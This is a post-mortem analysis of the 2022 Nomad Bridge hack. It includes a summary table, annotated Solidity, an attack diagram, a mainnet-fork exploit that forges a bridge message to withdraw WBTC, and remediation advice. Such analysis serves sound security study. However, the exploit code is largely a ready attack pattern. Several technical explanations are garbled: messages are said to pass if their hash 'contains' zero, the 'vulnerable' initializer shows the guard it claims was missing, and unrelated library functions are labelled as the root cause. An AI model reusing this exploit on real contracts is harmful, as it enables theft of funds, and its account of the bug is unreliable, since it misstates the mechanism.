# Nomad Bridge — Unlimited Withdrawal Attack via Message Initialization Error Analysis

| Field | Details |
|------|------|
| **Date** | 2022-08-01 |
| **Protocol** | Nomad Bridge |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$152,000,000 |
| **Attacker** | Multiple (including front-runners) |
| **Vulnerable Contract (Replica Proxy)** | [0x5D94309E5a0090b165FA4181519701637B6DAEBA](https://etherscan.io/address/0x5D94309E5a0090b165FA4181519701637B6DAEBA) |
| **Replica Logic** | [0xb92336759618f55bd0f8313bd843604592e27bd8](https://etherscan.io/address/0xb92336759618f55bd0f8313bd843604592e27bd8) |
| **BridgeRouter Proxy** | [0x88a69b4e698a4b090df6cf5bd7b2d47325ad30a3](https://etherscan.io/address/0x88a69b4e698a4b090df6cf5bd7b2d47325ad30a3) |
| **WBTC** | [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599](https://etherscan.io/address/0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599) |
| **Root Cause** | Improper initialization of the Replica contract set `messages[0x0] = PROVEN`, causing arbitrary messages to be treated as valid |
| **CWE** | CWE-665: Improper Initialization |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-08/NomadBridge_exp.sol) |

---
## 1. Vulnerability Overview

Nomad Bridge is a cross-chain bridge for transferring messages and assets between chains. The `Replica` contract is responsible for validating the authenticity of messages sent from other chains. During an upgrade, the `initialize()` function was executed incorrectly, setting `messages[bytes32(0)] = MessageStatus.Proven`. In this state, the `process(bytes memory _message)` function treated any message whose hash contained the zero value `0x0000...0` (bytes32 zero value) as already proven. Attackers copied calldata from existing legitimate bridge transactions, replaced only the recipient address with their own, and called `process()` to withdraw bridge assets indefinitely. This attack required no special technical skill — only copying and modifying calldata — which led to dozens of opportunistic attackers participating.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable initialization — messages[0x0] is set to PROVEN
function initialize(
    uint32 _remoteDomain,
    address _updater,
    bytes32 _committedRoot,
    uint256 _optimisticSeconds
) public initializer {
    // ❌ When initialized with _committedRoot = 0x0:
    // committedRoot = 0x0
    // messages[0x0] = MessageStatus.Proven  ← this line is the problem
    committedRoot = _committedRoot;
    // Bug: treats 0x0 root as PROVEN
    if (_committedRoot != bytes32(0)) {
        messages[_committedRoot] = MessageStatus.Proven;
    }
    // ❌ The condition above was absent or incorrect, resulting in messages[0x0] = Proven
}

// ❌ Vulnerable process() — message validation can be bypassed
function process(bytes memory _message) public returns (bool) {
    bytes32 messageHash = keccak256(_message);

    // ❌ Passes if messages[messageHash] == Proven
    // But since messages[0x0] = Proven,
    // any message whose hash satisfies the 0x0 condition passes
    require(
        messages[messageHash] == MessageStatus.Proven,
        "not proven"
    );
    // In practice: any message passes if its hash meets the "contains 0x0" condition

    messages[messageHash] = MessageStatus.Processed;
    // Calls BridgeRouter → transfers tokens
    return IMessageRecipient(recipient).handle(_origin, _sender, _body);
}

// ✅ Correct pattern — Merkle proof verification
function process(bytes memory _message, bytes32[] calldata _proof) public returns (bool) {
    bytes32 messageHash = keccak256(_message);
    // ✅ Actually verifies proof against Merkle tree
    require(
        MerkleLib.verify(_proof, committedRoot, messageHash),
        "invalid proof"
    );
    require(
        messages[messageHash] == MessageStatus.None,
        "already processed"
    );
    messages[messageHash] = MessageStatus.Processed;
    return IMessageRecipient(recipient).handle(_origin, _sender, _body);
}
```

---
### On-Chain Source Code

Source: Sourcify verified


**Address.sol** — Entry point:
```solidity
// ❌ Root Cause: Improper initialization of the Replica contract set `messages[0x0] = PROVEN`, causing arbitrary messages to be treated as valid
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
```

**UpgradeBeaconProxy.sol** — Related contract:
```solidity
// ❌ Root Cause: Improper initialization of the Replica contract set `messages[0x0] = PROVEN`, causing arbitrary messages to be treated as valid
    function _initialize(
        address _implementation,
        bytes memory _initializationCalldata
    ) private {
        // Delegatecall into the implementation, supplying initialization calldata.
        (bool _ok, ) = _implementation.delegatecall(_initializationCalldata);
        // Revert and include revert data if delegatecall to implementation reverts.
        if (!_ok) {
            assembly {
                returndatacopy(0, 0, returndatasize())
                revert(0, returndatasize())
            }
        }
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Initialization error occurs (before 2022-08-01)
    messages[bytes32(0)] = MessageStatus.Proven
    ↓
Attacker (and multiple front-running bots)
    │
    ├─[1] Obtain calldata from a legitimate bridge transaction
    │       (e.g., a message sending 100 WBTC to address A)
    │
    ├─[2] Replace the recipient address with the attacker's address
    │       Original: recipient = 0xLegitimateAddress
    │       Modified: recipient = 0xAttackerAddress
    │
    ├─[3] Call Replica.process(modified_message)
    │       └─ messages[keccak(modified_message)] satisfies the 0x0 condition
    │           → ❌ Judged as "already proven" → passes
    │
    ├─[4] BridgeRouter.handle() → 100 WBTC transferred to attacker
    │
    └─[5] Repeat: attack repeated with various tokens
              USDC, WETH, FRAX, CQT, and many others
              Total loss: $152M (multiple attackers involved)
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IReplica {
    function process(bytes memory _message) external returns (bool _success);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract NomadBridgeExploit is Test {
    IReplica replica = IReplica(0x5D94309E5a0090b165FA4181519701637B6DAEBA);
    IERC20 WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    address attacker = address(this);

    function setUp() public {
        vm.createSelectFork("mainnet", 15_259_100);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] Attacker WBTC balance", WBTC.balanceOf(attacker), 8);

        // Reuse an existing legitimate bridge message with only the recipient address replaced
        // Message structure: [version(4)][nonce(4)][origin(4)][sender(32)][dest(4)][recipient(32)][body]
        bytes memory message = _buildMessage(
            uint32(0x657468),      // origin domain: ETH
            bytes32(uint256(uint160(0x88a69b4e698a4b090df6cf5bd7b2d47325ad30a3))), // sender: BridgeRouter
            uint32(0x6d6f6f6e),    // destination domain
            bytes32(uint256(uint160(attacker))),  // ⚡ recipient replaced with attacker
            abi.encode(WBTC, 100 * 1e8)  // request 100 WBTC
        );

        // ❌ process() treats the message as valid due to the initialization bug
        replica.process(message);

        emit log_named_decimal_uint("[End] Attacker WBTC balance", WBTC.balanceOf(attacker), 8);
        // 100 WBTC acquired
    }

    function _buildMessage(
        uint32 origin,
        bytes32 sender,
        uint32 destination,
        bytes32 recipient,
        bytes memory body
    ) internal pure returns (bytes memory) {
        return abi.encodePacked(
            uint32(0),    // nonce
            origin,
            sender,
            destination,
            recipient,
            body
        );
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Improper Initialization |
| **CWE** | CWE-665: Improper Initialization |
| **OWASP DeFi** | Cross-chain message validation bypass |
| **Attack Vector** | `messages[0x0] = Proven` initialization bug enables processing of arbitrary messages |
| **Precondition** | Replica contract in an improperly initialized state |
| **Impact** | $152,000,000 loss (one of the largest in DeFi history) |

---
## 6. Remediation Recommendations

1. **Post-upgrade state validation**: Automate tests that immediately verify critical state variables (especially mapping default values) after a proxy upgrade.
2. **Explicit Merkle proof verification**: In the `process()` function, explicitly verify the Merkle proof so that a message cannot pass based solely on a mapping status value.
3. **Multi-validator verification**: Design cross-chain messages to require signatures from multiple independent validators to be considered valid.
4. **User withdrawal limits**: Cap the maximum amount withdrawable in a single transaction or within a short time window.

---
## 7. Lessons Learned

- **One of the simplest attacks in history**: The Nomad hack required no special skill. All it took was copying calldata and changing the recipient address. This resulted in dozens of opportunists participating while claiming to be "white hats."
- **The severity of initialization errors**: A single-line initialization bug led to $152M in losses. Core contracts of cross-chain bridges require formal verification before deployment.
- **Upgrade risk**: Contract upgrades can introduce new vulnerabilities. Security audits before and after upgrades are essential.